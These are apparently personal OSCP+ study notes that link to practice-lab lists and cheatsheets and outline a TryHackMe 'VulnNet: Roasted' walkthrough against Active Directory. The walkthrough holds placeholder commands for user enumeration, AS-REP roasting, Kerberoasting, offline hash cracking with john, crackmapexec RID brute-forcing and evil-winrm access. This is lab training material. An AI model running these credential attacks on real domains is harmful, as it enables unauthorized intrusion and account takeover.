# OSCP+ Notes
https://heathen.gitbook.io/oscp+-notes

## LainKusanagi List of OSCP like machines
https://docs.google.com/spreadsheets/u/0/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/htmlview?pli=1

## NetSecFocus Trophy Room
https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview

## Vulnhub Writeups
https://github.com/Vanshal/Vulnhub-Writeups

## Pentesting Cheatsheet
https://github.com/Vanshal/Pentesting-Cheatsheet

## Must-Know AD Attacks
- AS-REP Roasting
- Kerberoasting
- DCSync Attacks
- WIndows Privilege Escalation
- Mimikatz/credential extraction or Lazagna
- Pass-the-Hash
- Lateral Movement Basics
- RID-brute with anonymous logging
- Impacket login analysis

## Nice to Haves for AD
- Bloodhound Analysis
- God Potato

# TryHackMe - VulnNet: Roasted
- Scan ports, medium min max rat
- attempt anonymous access with `rpcclient`
    - Doesn't work
- SMB `smbclient` list anonymous shares with `-L`
    - Two shares are not default
        - Listing data in both shares with smbclient `-U`
            - List info with `dir` then `get` interesting files
                - Files contain PII which may be useful for AD
    - `crackmapexec` smb `<target>`
    - `seclists usernames`
    - `kerbrute` `userenum <seclists_usernames>` `--dc <target>` `-d names`
        - Reveals user with valid hash
            - `impacket-GetNPUsers <dir> -dc-ip <target> -usersfile <userfile> -format john -outputfile <hashes.txt>`
                - Reveals kerberos database hash in john format
                    - `john <hash file> --wordlist=<rockyou.txt>`
                        - Reveals password
                            - `crackmapexec smb <target> -u <enum_user> -p <john_cracked_password>`
                            - `crackmapexec winrm ...`
                            - NO SHELL
                - kerberoasting
                    `impacket-GetUserSPNs -dc-ip <target> <john_credentials> -request`
                        - Reveals kerberoast cache has a valid revealed username
- ...Save hash
    - `john <kerberoast_hash_file> --wordlist=<rockyou.txt>`
    - `crackmapexec smb <target> -u <enum_user> -p <kerberoast_john_password>`
        - no dice
    - `crackmapexec smb -u <enum_revealed_user> -p <john_crack_password> --rid-brute`
        - Reveals users under RID bruteforce
    - `crackmapexec rpc <target> -u <enum_user> -p <kerberoast_john_password>`
        - `evil-winrm -u <john_user> -p <kerberoast_john_password> -i <target>`
            - `Get-ADUser $env:username -Properties MemberOf`
            - `net user /domain`
            - `ResetPassword.vbs`
                
